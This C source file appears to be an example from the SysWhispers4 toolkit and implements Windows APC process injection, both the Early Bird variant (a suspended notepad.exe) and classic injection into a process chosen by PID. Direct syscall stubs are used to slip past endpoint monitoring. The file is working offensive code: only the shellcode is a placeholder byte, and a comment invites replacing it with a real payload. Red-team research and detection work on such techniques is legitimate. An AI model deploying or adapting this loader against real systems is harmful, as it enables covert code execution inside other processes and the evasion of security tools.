/*
 * SysWhispers4 — Example: APC (Asynchronous Procedure Call) Injection
 *
 * FOR AUTHORIZED SECURITY TESTING AND RESEARCH ONLY.
 * Unauthorized use against systems you do not own is illegal.
 *
 * Technique:
 *   1. Open target process and allocate memory for shellcode
 *   2. Write shellcode into remote process
 *   3. Open a thread in the target process
 *   4. Queue an APC to the thread that points to the shellcode
 *   5. The shellcode executes when the thread enters an alertable wait
 *
 * Variant: Early Bird injection
 *   Create a process in a suspended state, queue APC to its main thread,
 *   then resume — the APC fires before the entry point runs.
 *
 * Generated with:
 *   python syswhispers.py --preset injection --method indirect --resolve freshycalls
 *
 * Compile (MSVC):
 *   cl /nologo /W3 example_apc_injection.c SW4Syscalls.c SW4Syscalls.asm
 *
 * Compile (MinGW):
 *   x86_64-w64-mingw32-gcc -masm=intel example_apc_injection.c SW4Syscalls.c SW4Syscalls_stubs.c -o apc.exe
 */
#include <stdio.h>
#include <string.h>
#include "SW4Syscalls.h"

/* Placeholder shellcode — replace with real payload */
static const unsigned char shellcode[] = {
    0xCC, /* int3 — breakpoint for testing */
};

/*
 * Early Bird APC Injection:
 * Creates a suspended process, queues APC before it starts.
 */
static int early_bird_inject(void) {
    NTSTATUS status;
    HANDLE hProcess = NULL;
    HANDLE hThread  = NULL;

    /* Create a suspended process */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    wchar_t targetExe[] = L"C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessW(
            targetExe, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[!] CreateProcessW failed: %lu\n", GetLastError());
        return 1;
    }
    hProcess = pi.hProcess;
    hThread  = pi.hThread;
    printf("[+] Created suspended process PID=%lu TID=%lu\n",
           pi.dwProcessId, pi.dwThreadId);

    /* Allocate memory in the suspended process */
    PVOID  remoteBase = NULL;
    SIZE_T regionSize = sizeof(shellcode);
    status = SW4_NtAllocateVirtualMemory(
        hProcess,
        &remoteBase,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Allocated %llu bytes at 0x%p\n",
           (unsigned long long)regionSize, remoteBase);

    /* Write shellcode */
    SIZE_T written = 0;
    status = SW4_NtWriteVirtualMemory(
        hProcess,
        remoteBase,
        (PVOID)shellcode,
        sizeof(shellcode),
        &written
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Wrote %llu bytes of shellcode\n", (unsigned long long)written);

    /* Change to RX */
    ULONG oldProt = 0;
    status = SW4_NtProtectVirtualMemory(
        hProcess,
        &remoteBase,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProt
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtProtectVirtualMemory failed: 0x%08X\n", status);
        goto cleanup;
    }

    /*
     * Queue APC to the suspended thread.
     * When we resume the thread, the APC fires before the process
     * entry point — this is the "Early Bird" technique.
     */
    status = SW4_NtQueueApcThread(
        hThread,
        (PPS_APC_ROUTINE)remoteBase,    /* APC routine = our shellcode */
        NULL,                            /* ApcArgument1 */
        NULL,                            /* ApcArgument2 */
        NULL                             /* ApcArgument3 */
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtQueueApcThread failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] APC queued to thread %lu\n", pi.dwThreadId);

    /* Alert and resume the thread — triggers the APC */
    ULONG suspendCount = 0;
    status = SW4_NtAlertResumeThread(hThread, &suspendCount);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtAlertResumeThread failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Thread resumed — APC will fire (Early Bird)\n");

    /* Wait for process */
    SW4_NtWaitForSingleObject(hProcess, FALSE, NULL);
    printf("[+] Early Bird APC injection complete.\n");

cleanup:
    if (hThread)  SW4_NtClose(hThread);
    if (hProcess) SW4_NtClose(hProcess);
    return NT_SUCCESS(status) ? 0 : 1;
}

/*
 * Classic APC injection into an existing alertable thread.
 * Requires the target to have a thread in an alertable wait state
 * (e.g., SleepEx, WaitForSingleObjectEx with bAlertable=TRUE).
 */
static int classic_apc_inject(DWORD targetPid) {
    NTSTATUS status;

    /* Open the target process */
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
    CLIENT_ID cid = { (PVOID)(ULONG_PTR)targetPid, NULL };

    status = SW4_NtOpenProcess(
        &hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        &objAttr,
        &cid
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtOpenProcess(%lu) failed: 0x%08X\n", targetPid, status);
        return 1;
    }
    printf("[+] Opened process %lu\n", targetPid);

    /* Allocate + write shellcode */
    PVOID  remoteBase = NULL;
    SIZE_T regionSize = sizeof(shellcode);
    status = SW4_NtAllocateVirtualMemory(
        hProcess, &remoteBase, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
        SW4_NtClose(hProcess);
        return 1;
    }

    SIZE_T written = 0;
    status = SW4_NtWriteVirtualMemory(
        hProcess, remoteBase, (PVOID)shellcode,
        sizeof(shellcode), &written
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08X\n", status);
        SW4_NtClose(hProcess);
        return 1;
    }

    ULONG oldProt = 0;
    SW4_NtProtectVirtualMemory(
        hProcess, &remoteBase, &regionSize,
        PAGE_EXECUTE_READ, &oldProt
    );
    printf("[+] Shellcode written at 0x%p\n", remoteBase);

    /*
     * Enumerate threads of the target process using NtQuerySystemInformation.
     * Find a thread to queue APC to.
     */
    ULONG bufSize = 1024 * 1024;
    PVOID sysInfo = VirtualAlloc(NULL, bufSize, MEM_COMMIT, PAGE_READWRITE);
    if (!sysInfo) {
        SW4_NtClose(hProcess);
        return 1;
    }

    status = SW4_NtQuerySystemInformation(
        SystemProcessInformation,
        sysInfo,
        bufSize,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtQuerySystemInformation failed: 0x%08X\n", status);
        VirtualFree(sysInfo, 0, MEM_RELEASE);
        SW4_NtClose(hProcess);
        return 1;
    }

    /* Walk SYSTEM_PROCESS_INFORMATION to find our target process */
    SYSTEM_PROCESS_INFORMATION *proc = (SYSTEM_PROCESS_INFORMATION *)sysInfo;
    DWORD targetTid = 0;
    for (;;) {
        if ((ULONG_PTR)proc->UniqueProcessId == targetPid) {
            /* Use the first thread */
            SYSTEM_THREAD_INFORMATION *threads =
                (SYSTEM_THREAD_INFORMATION *)((PBYTE)proc + sizeof(*proc));
            if (proc->NumberOfThreads > 0) {
                targetTid = (DWORD)(ULONG_PTR)threads[0].ClientId.UniqueThread;
            }
            break;
        }
        if (proc->NextEntryOffset == 0) break;
        proc = (SYSTEM_PROCESS_INFORMATION *)((PBYTE)proc + proc->NextEntryOffset);
    }
    VirtualFree(sysInfo, 0, MEM_RELEASE);

    if (targetTid == 0) {
        fprintf(stderr, "[!] No threads found in PID %lu\n", targetPid);
        SW4_NtClose(hProcess);
        return 1;
    }
    printf("[+] Found thread TID=%lu\n", targetTid);

    /* Open the thread */
    HANDLE hThread = NULL;
    CLIENT_ID tcid = { (PVOID)(ULONG_PTR)targetPid, (PVOID)(ULONG_PTR)targetTid };
    status = SW4_NtOpenThread(
        &hThread,
        THREAD_SET_CONTEXT,
        &objAttr,
        &tcid
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtOpenThread(%lu) failed: 0x%08X\n", targetTid, status);
        SW4_NtClose(hProcess);
        return 1;
    }

    /* Queue APC */
    status = SW4_NtQueueApcThread(
        hThread,
        (PPS_APC_ROUTINE)remoteBase,
        NULL, NULL, NULL
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtQueueApcThread failed: 0x%08X\n", status);
    } else {
        printf("[+] APC queued — will execute when thread enters alertable wait\n");
    }

    SW4_NtClose(hThread);
    SW4_NtClose(hProcess);
    return NT_SUCCESS(status) ? 0 : 1;
}

int main(int argc, char *argv[]) {
    /* Initialize SysWhispers4 */
    if (!SW4_Initialize()) {
        fprintf(stderr, "[!] SW4_Initialize failed\n");
        return 1;
    }
    printf("[+] SysWhispers4 initialized\n\n");

    if (argc >= 2 && strcmp(argv[1], "--earlybird") == 0) {
        printf("=== Early Bird APC Injection ===\n");
        return early_bird_inject();
    } else if (argc >= 2) {
        DWORD pid = (DWORD)atoi(argv[1]);
        printf("=== Classic APC Injection into PID %lu ===\n", pid);
        return classic_apc_inject(pid);
    } else {
        printf("Usage:\n");
        printf("  %s --earlybird      Early Bird injection (creates suspended notepad.exe)\n", argv[0]);
        printf("  %s <PID>            Classic APC injection into existing process\n", argv[0]);
        return 1;
    }
}
